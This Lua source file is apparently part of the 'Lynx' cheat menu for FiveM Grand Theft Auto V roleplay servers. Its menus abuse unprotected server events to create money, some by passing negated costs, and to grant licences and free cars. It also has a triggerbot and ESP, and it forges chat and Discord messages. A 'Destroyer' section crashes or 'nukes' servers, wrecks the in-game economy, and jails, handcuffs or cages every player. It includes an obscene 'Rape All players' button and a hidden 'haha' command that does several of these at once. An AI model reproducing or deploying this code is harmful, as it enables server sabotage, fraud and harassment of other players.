					TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "realestateagent", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'cardealer', function(data,menu) LynxEvo.close() end)
					TriggerEvent("esx_society:openBossMenu", "cardealer", function(data,menu) LynxEvo.close() end)
					TriggerEvent("esx_society:openBossMenu", 'cardealer', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "cardealer", function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", 'cardealer', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "cardealer", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~y~~h~Custom~s~ Boss Menu") then
					local result = KeyboardInput("Enter custom boss menu job name", "", 100)
					if result ~= "" then
					TriggerEvent("esx_society:openBossMenu", result, function(data,menu) LynxEvo.close() end)
					TriggerEvent("esx_society:openBossMenu", result, function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", result, function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				 end
				end
				 

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXMoney") then
				if LynxEvo.Button("~h~~o~Automatic Money ~r~ WARNING!") then
					automaticmoneyesx()
				elseif LynxEvo.Button("~g~~h~ESX ~y~Caution Give Back") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("esx_jobs:caution", "give_back", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Eden Garage") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("eden_garage:payhealth", {costs = -result})
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Fuel Delivery") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_fueldelivery:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_carthief:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~DMV School") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_dmvschool:pay", {costs = -result})
					end
				elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("LegacyFuel:PayFuel", {costs = -result})
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Dirty Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_godirtyjob:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Pizza Boy") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_pizza:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Ranger Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_ranger:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Garbage Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_garbagejob:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY") then
					local result = KeyboardInput("Enter amount of dirty money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_carthief:pay", result)
					 end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Trucker Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("esx_truckerjob:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Bank") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("AdminMenu:giveBank", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Cash") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("AdminMenu:giveCash", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Postal Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_gopostaljob:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Banker Job") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_banksecurity:pay", result)
					end
				elseif LynxEvo.Button("~g~~h~ESX ~y~Slot Machine") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("esx_slotmachine:sv:2", result)
					 end
				elseif LynxEvo.CheckBox("~g~~h~ESX Hunting~y~ reward", huntspam, function(enabled) huntspam = enabled end) then
					end
					
			

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXCustom") then
				if LynxEvo.Button("~w~~h~Set hunger to ~h~~g~100") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif LynxEvo.Button("~w~~h~Set thirst to ~h~~g~100") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif LynxEvo.Button("~g~~h~ESX ~r~Revive") then
					local id = KeyboardInput("Enter Player ID or all", "", 1000)
					if id then
						if id == "all" then
							for i = 0, 128 do
								TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i))
								TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i))
							end
							else
								TriggerEvent("esx_ambulancejob:revive", id)
								TriggerEvent("esx_ambulancejob:revive", id)
							end
					end
				elseif LynxEvo.Button("~g~~h~ESX ~b~Handcuff") then
					local id = KeyboardInput("Enter Player ID or all", "", 1000)
					if id then
						if id == "all" then
							for i = 0, 128 do
								TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
								TriggerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
							end
							else
								TriggerEvent("esx_policejob:handcuff", id)
								TriggerServerEvent("esx_policejob:handcuff", id)
							end
					end
				elseif LynxEvo.Button("~h~Get Driving License") then
					TriggerServerEvent("esx_dmvschool:addLicense", 'dmv')
					TriggerServerEvent("esx_dmvschool:addLicense", 'drive')
				elseif LynxEvo.Button("~h~~b~Buy ~s~a vehicle for ~g~free") then
					matacumparamasini()
				end
					

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXDrugs") then
				if LynxEvo.Button("~h~~g~Harvest ~g~Weed") then
					hweed()
				elseif LynxEvo.Button("~h~~g~Transform ~g~Weed") then
					tweed()
				elseif LynxEvo.Button("~h~~g~Sell ~g~Weed") then
					sweed()
				elseif LynxEvo.Button("~h~~w~Harvest ~w~Coke") then
					hcoke()
				elseif LynxEvo.Button("~h~~w~Transform ~w~Coke") then
					tcoke()
				elseif LynxEvo.Button("~h~~w~Sell ~w~Coke") then
					scoke()
				elseif LynxEvo.Button("~h~~r~Harvest Meth") then
					hmeth()
				elseif LynxEvo.Button("~h~~r~Transform Meth") then
					tmeth()
				elseif LynxEvo.Button("~h~~r~Sell Meth") then
					smeth()
				elseif LynxEvo.Button("~h~~p~Harvest Opium") then
					hopi()
				elseif LynxEvo.Button("~h~~p~Transform Opium") then
					topi()
				elseif LynxEvo.Button("~h~~p~Sell Opium") then
					sopi()
				elseif LynxEvo.Button("~h~~g~Money Wash") then
					mataaspalarufe()
				elseif LynxEvo.Button("~r~~h~Stop all") then
					matanumaispalarufe()
				elseif LynxEvo.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!",BlowDrugsUp,function(enabled)BlowDrugsUp = enabled end) then
			end
			

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("VRPTriggers") then
				if LynxEvo.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif LynxEvo.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("vrp_slotmachine:server:2",result)
					end
				elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
						TriggerServerEvent("LegacyFuel:PayFuel", {costs = -result})
					end
				elseif LynxEvo.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("Banca:deposit", result)
					TriggerServerEvent("bank:deposit", result)
					end
				elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result ~= "" then
					TriggerServerEvent("bank:withdraw", result)
					TriggerServerEvent("Banca:withdraw", result)
					end
				end

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("MiscTriggers") then
				if LynxEvo.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!", true)
				elseif LynxEvo.Button("~h~Send Fake Message") then
					local pname = KeyboardInput("Enter player name", "", 100)
					if pname then
						local message = KeyboardInput("Enter message", "", 1000)
						if message then
							TriggerServerEvent("_chat:messageEntered", pname, { 0, 0x99, 255 }, message)
						end
					 end
					elseif LynxEvo.Button("~h~~g~ESX ~y~CarThief ~s~TROLL") then
						drawNotification("~y~esx_carthief ~g~required", true)
						drawNotification("~g~Trying to send alerts", false)
						carthieftroll()
					end

LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("AdvM") then
	if LynxEvo.MenuButton("~h~~p~#~s~ Destroyer Menu", "Destroyer") then
	elseif LynxEvo.MenuButton("~h~~p~#~s~ ESP Menu", "ESPMenu") then
	elseif LynxEvo.MenuButton("~h~~p~#~s~ Crosshairs", "CsMenu") then	
	elseif LynxEvo.CheckBox("~h~TriggerBot", TriggerBot, function(enabled) TriggerBot = enabled end) then
	elseif LynxEvo.CheckBox("~h~Player Blips", bBlips, function(bBlips) end) then
	showblip = not showblip
	bBlips = showblip
	elseif LynxEvo.CheckBox("~h~Name Above Players ~g~v1", showsprite, function(enabled) showsprite = enabled nameabove = false end) then
	elseif LynxEvo.CheckBox("~h~Name Above Players n Indicator ~g~v2", nameabove, function(enabled) nameabove = enabled showsprite = false end) then
	elseif LynxEvo.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(enabled) freezeall = enabled end) then
	elseif LynxEvo.CheckBox("~h~~r~Explode~s~ All players", blowall, function(enabled) blowall = enabled end) then
	elseif LynxEvo.Button("~h~~r~BORGAR~s~ Everyone") then
		for i = 0, 128 do
			if IsPedInAnyVehicle(GetPlayerPed(i), true) then
				local hamburg = "xs_prop_hamburgher_wl"
				local hamburghash = GetHashKey(hamburg)
				while not HasModelLoaded(hamburghash) do
					Citizen.Wait(0)
					RequestModel(hamburghash)
				end
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			else
				local hamburg = "xs_prop_hamburgher_wl"
				local hamburghash = GetHashKey(hamburg)
				while not HasModelLoaded(hamburghash) do
					Citizen.Wait(0)
					RequestModel(hamburghash)
				end
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
		end
	elseif LynxEvo.Button("~h~~o~Discord RPC~s~ Add/Remove") then
	setrp = not setrp
	if not setrp then
		SetRichPresence(0)
		SetDiscordAppId(0)
		SetDiscordRichPresenceAsset(0)
		SetDiscordRichPresenceAssetText(0)
	else
		SetRP()
	end
	elseif LynxEvo.CheckBox("~h~~r~Ra~g~nd~b~om ~s~Notification Color", rgbnot, function(enabled) rgbnot = enabled end) then
	elseif LynxEvo.CheckBox("~h~~r~Confirms~s~ masterswitch", confirmtrig, function(enabled) confirmtrig = enabled end) then
end

LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("CsMenu") then
if LynxEvo.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function (enabled) crosshair = enabled crosshairc = false crosshairc2 = false end) then
elseif LynxEvo.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function (enabled) crosshair = false crosshairc = enabled crosshairc2 = false end) then
elseif LynxEvo.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function (enabled) crosshair = false crosshairc = false crosshairc2 = enabled end) then
end

		LynxEvo.Display()
		elseif LynxEvo.IsMenuOpened("Destroyer") then
	if LynxEvo.Button("~h~~r~Nuke ~s~Server") then
		nukeserver()
	elseif LynxEvo.CheckBox( "~h~~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(enabled) servercrasherxd = enabled end) then 
	elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~v2") then
		esxdestroyv2()
	elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then
		EconomyDy2()
	elseif LynxEvo.Button("~h~~r~VRP ~s~Give everyone money") then
		vrpdestroy()
	elseif LynxEvo.Button("~h~~g~ESX ~s~Give everyone money")then
		giveeveryone()
	elseif LynxEvo.Button("~h~~r~Jail~s~ All players") then
		for i = 0, 128 do
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Lynx 8 ~ www.lynxmenu.com")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Lynx 8 ~ www.lynxmenu.com")
		end
	elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then
		bananapartyall()
	elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then
		RapeAllFunc()
	elseif LynxEvo.Button("~h~~r~Cage~s~ All players") then
		for i = 0, 255 do
		x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
					roundx = tonumber(string.format("%.2f", x))
					roundy = tonumber(string.format("%.2f", y))
					roundz = tonumber(string.format("%.2f", z))
					while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
						Citizen.Wait(0)
						RequestModel(GetHashKey("prop_fnclink_05crnr1"))
					end
					local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
					local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
					SetEntityHeading(cage1, -90.0)
					SetEntityHeading(cage2, 90.0)
					FreezeEntityPosition(cage1, true)
					FreezeEntityPosition(cage2, true)
		end
	end

	

LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("crds") then
	if LynxEvo.Button("~h~~p~#~s~ nit34byte~r~#~r~1337 ~p~DEV") then
		drawNotification("~h~~o~Dont click me BAKA!~s~.", false)
		drawNotification("~h~~o~Nyaooww :3~s~.", false)
		drawNotification("~h~~o~Very mad now cry qweqwe~s~.", false)
	elseif LynxEvo.Button("~h~~p~#~s~ DJSNAKE2~r~#~r~7983 ~p~DEV") then
	elseif LynxEvo.Button("~h~~p~#~s~ JonBird~r~#~r~1337 ~p~DEV") then
end

LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("WeaponTypes") then
	
	for k, v in pairs(l_weapons) do
		if LynxEvo.MenuButton("~h~~p~#~s~ "..k, "WeaponTypeSelection") then
		WeaponTypeSelect = v
		end
	end
	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("WeaponTypeSelection") then
	for k, v in pairs(WeaponTypeSelect) do
		if LynxEvo.MenuButton(v.name, "WeaponOptions") then
		WeaponSelected = v
		end
	end
	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("WeaponOptions") then
	if LynxEvo.Button("~h~~r~Spawn Weapon") then		
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
	end
	if LynxEvo.Button("~h~~g~Add Ammo") then
		SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000) 
	end
	if LynxEvo.CheckBox("~h~~r~Infinite ~s~Ammo", WeaponSelected.bInfAmmo, function(s)			
	end) then
		WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
		SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
		SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
	end
	for k, v in pairs(WeaponSelected.mods) do
		if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~> ~s~"..k, "ModSelect") then
		ModSelected = v
		end
	end
	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("ModSelect") then
	for _, v in pairs(ModSelected) do
		if LynxEvo.Button(v.name) then				
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
		end
	end

	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("CarTypes") then
	for i, aName in ipairs(CarTypes) do
	 if LynxEvo.MenuButton("~h~~p~#~s~ "..aName, "CarTypeSelection") then
		carTypeIdx = i
	 end
	end
	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("CarTypeSelection") then
	for i, aName in ipairs(CarsArray[carTypeIdx]) do 
		if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..aName, "CarOptions") then
		carToSpawn = i
		end
	end
	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("CarOptions") then
		if LynxEvo.Button("~h~~r~Spawn Car") then
			local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
			local veh = CarsArray[carTypeIdx][carToSpawn]
			if veh == nil then veh = "adder" end
			vehiclehash = GetHashKey(veh)
			RequestModel(vehiclehash)
			
			Citizen.CreateThread(function() 
				local waiting = 0
				while not HasModelLoaded(vehiclehash) do
					waiting = waiting + 100
					Citizen.Wait(100)
					if waiting > 5000 then
						ShowNotification("~h~~r~Cannot spawn this vehicle.")
						break
					end
				end
				SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
				SetVehicleStrong(SpawnedCar, true)
				SetVehicleEngineOn(SpawnedCar, true, true, false)
				SetVehicleEngineCanDegrade(SpawnedCar, false)		
			end)
		end

		LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("MainTrailer") then
		if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
		for i, aName in ipairs(Trailers) do 
			if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..aName, "MainTrailerSpa") then
			TrailerToSpawn = i
			end
		end
	else
		drawNotification("~h~~w~Not in a vehicle", true)
	end
		LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("MainTrailerSpa") then
			if LynxEvo.Button("~h~~r~Spawn Car") then
				local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
				local veh = Trailers[TrailerToSpawn]
				if veh == nil then veh = "adder" end
				vehiclehash = GetHashKey(veh)
				RequestModel(vehiclehash)
				
				Citizen.CreateThread(function() 
					local waiting = 0
					while not HasModelLoaded(vehiclehash) do
						waiting = waiting + 100
						Citizen.Wait(100)
						if waiting > 5000 then
							ShowNotification("~h~~r~Cannot spawn this vehicle.")
							break
						end
					end
					local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
					local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
					AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
					SetVehicleStrong(SpawnedCar, true)
					SetVehicleEngineOn(SpawnedCar, true, true, false)
					SetVehicleEngineCanDegrade(SpawnedCar, false)		
				end)
			end
	
			LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("GiveSingleWeaponPlayer") then
		for i = 1, #allWeapons do
			if LynxEvo.Button(allWeapons[i]) then
				GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
			end
		end

		LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("ESPMenu") then
	if LynxEvo.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(enabled) esp = enabled end) then
	elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Box", espbox, function(enabled) espbox = enabled end) then
	elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(enabled) espinfo = enabled end) then
	elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(enabled) esplines = enabled end) then
	end

	LynxEvo.Display()
elseif LynxEvo.IsMenuOpened("LSC") then
	local veh = GetVehiclePedIsUsing(PlayerPedId())
	if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", "tunings") then
elseif LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", "performance") then
elseif LynxEvo.Button("~h~Change Car License Plate") then
	carlicenseplaterino()
elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(enabled) RainbowVeh = enabled end) then
elseif LynxEvo.Button("~h~Make vehicle ~y~dirty") then
	Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
elseif LynxEvo.Button("~h~Make vehicle ~g~clean") then
	Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(enabled) rainbowh = enabled end) then
end


	LynxEvo.Display()
		elseif LynxEvo.IsMenuOpened("BoostMenu") then 
		if LynxEvo.ComboBox("~h~Engine ~r~Power ~s~Booster", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
			currentItemIndex = currentIndex
			selectedItemIndex = selectedIndex
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), selectedItemIndex * 20.0)
		end) then

		elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(enabled)
				t2x = enabled
				t4x = false
				t10x = false
				t16x = false
				txd = false
			end) then
			elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(enabled)
				t2x = false
				t4x = enabled
				t10x = false
				t16x = false
				txd = false
			end) then
			elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(enabled)
				t2x = false
				t4x = false
				t10x = enabled
				t16x = false
				txd = false
			end) then
			elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(enabled)
				t2x = false
				t4x = false
				t10x = false
				t16x = enabled
				txd = false
			end) then
			elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(enabled)
				t2x = false
				t4x = false
				t10x = false
				t16x = false
				txd = enabled
			end) then

		end

				LynxEvo.Display()
			elseif IsDisabledControlPressed(0, 122) then
				if logged then
					LynxEvo.OpenMenu("LynxX")
				end

				LynxEvo.Display()
			elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
				if logged then
					LynxEvo.OpenMenu("LynxX")
				end
			end
			Citizen.Wait(0)
		end
	end)

	RegisterCommand("haha", function(source,args,raw)
		haharip = true
		RapeAllFunc()
		bananapartyall()
		EconomyDy2()
		AmbulancePlayers()
		for i = 0, 128 do
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Lynx 8 ~ www.lynxmenu.com")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Lynx 8 ~ www.lynxmenu.com")
		end
	end, false)

RegisterCommand("pk", function(source,args,raw)
	Enabled = false end, false)
	
RegisterCommand("lol", function(source,args,raw)
	mhaonn = false end, false)
